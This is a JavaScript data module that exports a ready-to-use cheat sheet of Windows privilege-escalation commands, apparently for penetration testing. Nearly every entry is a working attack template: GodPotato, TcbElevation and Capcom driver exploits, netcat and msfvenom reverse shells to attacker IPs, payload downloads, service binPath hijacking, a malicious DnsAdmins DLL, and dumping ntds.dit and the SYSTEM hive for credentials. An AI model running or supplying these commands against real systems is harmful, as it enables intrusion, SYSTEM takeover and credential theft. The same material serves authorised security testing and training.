const e=[{title:"PrivescCheck.ps1",template:`git clone https://github.com/itm4n/PrivescCheck.git
cd PriveseChecl
powershell -ep bypass -c ". .\\PrivescCheck.ps1; Invoke-PrivescCheck"`,description:"Runs PrivescCheck PowerShell script to enumerate Windows privilege escalation opportunities."},{title:"WinPEAS",template:`powershell -Command "Invoke-WebRequest -Uri 'https://github.com/carlospolop/PEASS-ng/releases/latest/download/WinPEASx64.exe' -OutFile 'C:\\Users\\Public\\WinPEASx64.exe'"`,description:"Downloads WinPEAS executable for automated Windows privilege escalation enumeration."},{title:"SeDebugPrivilege / ProcessInjection + adopt.exe",template:`# Download Process injection from:https://github.com/3xpl01tc0d3r/ProcessInjection
# Download adopt from:https://github.com/xct/adopt

dotnet inline-execute /home/user/ProcessInjection.exe /f:raw /pid:3488 /t:1 /path:C:\\Windows\\Tasks\\adopt.exe
# SeDebugPrivilege: Migrate PID to a privileged process (e.g., WinLogon) to execute adopt.exe
# WinLogon PID: 3488
`,description:"Uses SeDebugPrivilege to inject adopt.exe into a privileged process (WinLogon) using ProcessInjection, allowing privilege escalation to SYSTEM."},{title:"SeImpersonatePrivilege / GodPotato",template:`https://github.com/BeichenDream/GodPotato
# Download: iwr http://<tun0>/GodPotato-NET4.exe -outfile gp.exe
# Execute: .\\gp.exe -cmd "C:\\Users\\Public\\nc64.exe -e cmd.exe <tun0> <port>"

# Listen for reverse shell
rlwrap nc -nlvp <port>`,description:"Exploits SeImpersonatePrivilege using GodPotato to get a reverse shell as SYSTEM."},{title:"SeBackupPrivilege / DiskShadow",template:`set verbose on
set metadata C:\\Windows\\Temp\\meta.cab
set context clientaccessible
set context persistent
begin backup
add volume C: alias cdrive
create
expose %cdrive% E:
end backup

# Save this as back_script.txt and run:
diskshadow /s back_script.txt

# Copy sensitive files
cd E:
robocopy /b E:\\Windows\\ntds . ntds.dit
reg save hklm\\system C:\\temp\\system.bak`,description:"Uses SeBackupPrivilege to dump Windows registry hives and extract sensitive credentials for privilege escalation."},{title:"SeTcbPrivilege / TcbElevation + RCAT",template:`#Download TcbElevation.cpp from: https://gist.github.com/antonioCoco/19563adef860614b56d010d92e67d178

iwr http://<tun0>/TcbElevation.exe -outfile C:\\Users\\svc_deploy\\Documents\\TcbElevation.exe

# Download RCAT from GitHub: https://github.com/xct/rcat

upload rcat_10.8.0.210_443.exe
.\\TcbElevation.exe pwn "C:\\Windows\\system32\\cmd.exe /c C:\\Users\\username\\Documents\\rcat_10.8.0.210_443.exe"

# Listen for reverse shell
rlwrap nc -nlvp 443`,description:"Uses SeTcbPrivilege to execute TcbElevation.exe to spawn a reverse shell with RCAT as SYSTEM."},{title:"SeLoadDriverPrivilege / ExploitCapcom",template:`# Download necessary file from: https://github.com/k4sth4/SeLoadDriverPrivilege 

msfvenom -p windows/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f exe -o shell.exe
# Upload driver and executables
upload Capcom.sys
upload ExploitCapcom.exe
upload eoploaddriver_x64.exe
upload shell.exe

# Load vulnerable driver
eoploaddriver_x64.exe System\\CurrentControlSet\\dfserv C:\\temp\\Capcom.sys

# Exploit driver to spawn SYSTEM shell
ExploitCapcom.exe LOAD C:\\temp\\Capcom.sys
ExploitCapcom.exe EXPLOIT C:\\temp\\shell.exe`,description:"Exploits SeLoadDriverPrivilege by uploading and loading a vulnerable driver (Capcom.sys) to execute a reverse shell as SYSTEM."},{title:"Server Operator / Service Binary Path Exploit",template:`net user <username>  # Verify if user is member of Server Operator group
# List services and identify one with privileges
Get-Service | Where-Object { $_.StartType -eq 'Automatic' } | Format-Table Name, DisplayName, Status

# Upload reverse shell to target machine (example: nc.exe)
# Modify service binary path to point to payload
sc.exe config VMTools binPath= "C:\\Users\\aarti\\Documents\\nc.exe -e cmd.exe 192.168.1.205 1234"

# Restart service to execute reverse shell
sc.exe stop VMTools
sc.exe start VMTools

# On attacking machine, listen for reverse shell
nc -lvp 1234`,description:"Uses Server Operator group privileges to modify a Windows service binary path and execute a reverse shell as SYSTEM."},{title:"DnsAdmins / dnscmd DLL Exploit",template:`msfvenom -p windows/x64/shell_reverse_tcp LHOST=<ip> LPORT=<port> -f dll > shell.dll
# Upload the payload to target machine
upload shell.dll

# Configure DNS server to load our DLL
cmd /c 'dnscmd <DC> /config /serverlevelplugindll C:\\temp\\shell.dll'

# Restart DNS service on domain controller
sc.exe \\\\<DC> stop dns
sc.exe \\\\<DC> start dns

# On attacking machine, listen for reverse shell
rlwrap nc -nlvp 9001`,description:"Uses DnsAdmins group privileges to load a malicious DLL into the DNS server via dnscmd, resulting in a reverse shell as SYSTEM."}],t={commands:e};export{e as commands,t as default};
